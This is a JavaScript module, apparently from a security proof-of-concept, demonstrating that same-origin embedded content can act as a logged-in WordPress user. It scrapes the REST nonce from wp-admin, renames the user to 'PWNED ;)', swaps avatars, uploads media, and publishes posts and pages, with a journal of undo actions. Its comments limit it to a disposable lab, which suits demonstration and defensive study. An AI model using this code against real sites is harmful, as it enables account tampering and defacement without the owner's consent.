/*
 * Acciones de demostración contra WordPress. Portadas de
 * poc/sandbox-video-probe-src/probe.js:485-598 sin cambiar su lógica de red.
 *
 * Solo se ejecutan cuando una persona pulsa el botón, solo funcionan en
 * same-origin (legacy) y solo contra un laboratorio propio y desechable.
 */

import { AVATAR_DATA_URI, avatarPng } from './avatar.js';

// Nonce REST: en páginas de wp-admin suele existir wpApiSettings.nonce, o un
// input[name=_wpnonce]. Cualquier acceso cross-origin lanza y devolvemos null.
export function wpNonce(win) {
  try { if (win.wpApiSettings && win.wpApiSettings.nonce) return win.wpApiSettings.nonce; } catch (e) { /* ignorado */ }
  try { var i = win.document.querySelector('input[name="_wpnonce"]'); if (i) return i.value; } catch (e) { /* ignorado */ }
  return null;
}

// Raíz de la REST API. Legacy (probe.js:501,548,581) codifica /wp-json/ sin
// consultar la configuración: con enlaces permanentes simples
// wpApiSettings.root sería <origen>/?rest_route=/ y el destino cambiaría. Se
// mantiene el literal para que escritura y undo apunten siempre al mismo sitio.
function wpApiRoot(ctx) {
  return ctx.win.location.origin + '/wp-json/';
}

// Cambia el display_name del usuario WP actual a "PWNED ;)" (REST + formulario).
export function rename(ctx, journal, cb) {
  if (ctx.win.origin === 'null' || ctx.win.location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
  var res = {};
  try {
    var w = ctx.parentWin();
    if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
    var root = ctx.win.location.origin;
    // Nombre actual, leído del DOM del padre ANTES de tocar nada: es lo que el
    // diario necesita como "previous" para poder documentar la reversión.
    var previousDisplayName = null;
    try {
      var nameEl = w.document.querySelector('#wp-admin-bar-my-account .display-name');
      previousDisplayName = nameEl ? nameEl.textContent.trim() : null;
    } catch (e) { previousDisplayName = null; }
    journal.record({
      host: 'wordpress', kind: 'user-display-name', label: 'display_name',
      id: 'me', previous: previousDisplayName, undo: null, // se revierte desde el perfil
    });
    var restNonce = wpNonce(w);
    var restP = restNonce
      ? w.fetch(root + '/wp-json/wp/v2/users/me', {
          method: 'POST', credentials: 'same-origin',
          headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': restNonce },
          body: JSON.stringify({ first_name: 'PWNED', last_name: ';)', nickname: 'PWNED ;)', name: 'PWNED ;)' })
        }).then(function (r) { return r.json().catch(function () { return {}; }).then(function (j) {
            res.rest = r.ok ? ('ok name=' + (j && j.name)) : ('HTTP ' + r.status + ' ' + ((j && j.code) || '')); }); })
          .catch(function (e) { res.rest = 'ERR:' + e.name; })
      : Promise.resolve().then(function () { res.rest = 'sin wpApiSettings.nonce (abre wp-admin)'; });
    var formP = w.fetch(root + '/wp-admin/profile.php', { credentials: 'same-origin' })
      .then(function (r) { return r.text(); }).then(function (html) {
        var d = new DOMParser().parseFromString(html, 'text/html');
        var form = d.querySelector('#your-profile');
        if (!form) { res.form = 'sin formulario de perfil (¿logueado?)'; return; }
        var fd = new FormData(form);
        fd.set('nickname', 'PWNED ;)'); fd.set('display_name', 'PWNED ;)');
        fd.set('first_name', 'PWNED'); fd.set('last_name', ';)');
        return w.fetch(root + '/wp-admin/profile.php', { method: 'POST', credentials: 'same-origin', body: fd })
          .then(function (rr) { res.form = rr.ok ? 'ok (display_name -> "PWNED ;)")' : ('HTTP ' + rr.status); });
      }).catch(function (e) { res.form = 'ERR:' + e.name; });
    Promise.all([restP, formP]).then(function () {
      res.note = 'Recarga wp-admin para ver el cambio. Reversible desde tu perfil.';
      cb(JSON.stringify(res, null, 2));
    });
  } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
}

// Cambia el avatar en el DOM del padre (instantáneo, reversible) y sube una
// imagen a la Biblioteca de Medios (escritura autenticada) como prueba.
export function photo(ctx, journal, cb) {
  if (ctx.win.origin === 'null' || ctx.win.location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
  var res = {};
  try {
    var w = ctx.parentWin();
    if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
    var root = wpApiRoot(ctx);
    // Mismo avatar propio (embebido, sin red) que usa la demo de Moodle.
    var avs = w.document.querySelectorAll('img.avatar, #wpadminbar img, .comment-author img');
    for (var i = 0; i < avs.length; i++) {
      if (!avs[i].hasAttribute('data-exe-orig')) { avs[i].setAttribute('data-exe-orig', avs[i].src); }
      avs[i].src = AVATAR_DATA_URI; avs[i].style.outline = '2px solid #b00020';
    }
    res.avatarSwappedInDom = avs.length;
    var nonce = wpNonce(w);
    if (!nonce) { res.mediaUpload = 'sin nonce REST (abre wp-admin)'; cb(JSON.stringify(res, null, 2)); return; }
    avatarPng(ctx.win, 256, function (blob) {
      if (!blob) { res.mediaUpload = 'img-render-fail (sin canvas)'; cb(JSON.stringify(res, null, 2)); return; }
      var fd = new FormData(); fd.append('file', blob, 'pwned-avatar.png'); fd.append('title', 'PWNED by embedded content');
      w.fetch(root + 'wp/v2/media', { method: 'POST', credentials: 'same-origin', headers: { 'X-WP-Nonce': nonce }, body: fd })
        .then(function (rr) { return rr.json().catch(function () { return {}; }).then(function (j) {
            if (rr.ok) {
              // Registro en el diario en cuanto la subida devuelve el id del
              // adjunto: no existe antes, así que no puede registrarse antes.
              journal.record({
                host: 'wordpress', kind: 'media', label: 'Adjunto ' + j.id, id: String(j.id),
                previous: null,
                undo: () => ctx.fetchSameOrigin(root + 'wp/v2/media/' + j.id + '?force=true',
                  { method: 'DELETE', headers: { 'X-WP-Nonce': nonce } }).then(() => undefined),
              });
              res.mediaUpload = 'ok id=' + j.id + ' ' + (j.source_url || '');
            } else {
              res.mediaUpload = 'HTTP ' + rr.status;
            }
          }); })
        .catch(function (e) { res.mediaUpload = 'ERR:' + e.name; })
        .then(function () { cb(JSON.stringify(res, null, 2)); });
    });
  } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
}

// Crea 2 entradas + 2 páginas de WordPress con las credenciales del usuario
// (same-origin), forjando el nonce REST leído de /wp-admin/. Equivalente al
// createCourse de Moodle. Solo en legacy (mismo origen); en modo secure
// (origen opaco) devuelve BLOQUEADO. Reversibles desde la papelera.
export function createContent(ctx, journal, cb) {
  if (ctx.win.origin === 'null' || ctx.win.location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
  var res = { posts: [], pages: [] };
  try {
    var w = ctx.parentWin();
    if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
    var root = wpApiRoot(ctx);
    var getNonce = function () {
      try { if (w.wpApiSettings && w.wpApiSettings.nonce) { return Promise.resolve(w.wpApiSettings.nonce); } } catch (e) { /* ignorado */ }
      return w.fetch(ctx.win.location.origin + '/wp-admin/', { credentials: 'same-origin' })
        .then(function (r) { return r.text(); })
        .then(function (html) {
          var m = html.match(/createNonceMiddleware\(\s*["']([0-9a-f]+)["']/)
               || html.match(/"nonce":"([0-9a-f]+)"/)
               || html.match(/wpApiSettings[\s\S]{0,120}?nonce["']?\s*[:=]\s*["']([0-9a-f]+)/);
          return m ? m[1] : null;
        });
    };
    getNonce().then(function (nonce) {
      if (!nonce) { cb('sin nonce REST (abre wp-admin / ¿admin?)'); return; }
      var headers = { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce };
      // endpoint: segmento REST plural ('posts'/'pages'); kind: tipo semántico
      // para el diario ('post'/'page'). title: trazable via journal.prefix.
      var create = function (endpoint, kind, title) {
        return w.fetch(root + 'wp/v2/' + endpoint, {
          method: 'POST', credentials: 'same-origin', headers: headers,
          body: JSON.stringify({ title: title, content: '<p>Creado por la PoC (contenido no confiable).</p>', status: 'publish' })
        }).then(function (r) { return r.json().catch(function () { return {}; }).then(function (j) {
            if (!r.ok) { return 'HTTP ' + r.status; }
            // Por cada entrada o página creada: se registra en cuanto la API
            // devuelve el id, igual que en media (no existe id antes de crear).
            journal.record({
              host: 'wordpress', kind: kind, label: title, id: String(j.id),
              previous: null,
              undo: () => ctx.fetchSameOrigin(root + 'wp/v2/' + endpoint + '/' + j.id,
                { method: 'DELETE', headers: { 'X-WP-Nonce': nonce } }).then(() => undefined),
            });
            return '#' + j.id;
          }); });
      };
      Promise.all([
        create('posts', 'post', journal.prefix('entrada')),
        create('posts', 'post', journal.prefix('entrada')),
        create('pages', 'page', journal.prefix('pagina')),
        create('pages', 'page', journal.prefix('pagina'))
      ]).then(function (r) {
        res.posts = [r[0], r[1]]; res.pages = [r[2], r[3]];
        res.note = 'Revisa Entradas y Páginas en wp-admin. Reversibles (papelera).';
        cb(JSON.stringify(res, null, 2));
      }).catch(function (e) { cb('ERR: ' + (e.message || e.name)); });
    }).catch(function (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); });
  } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
}
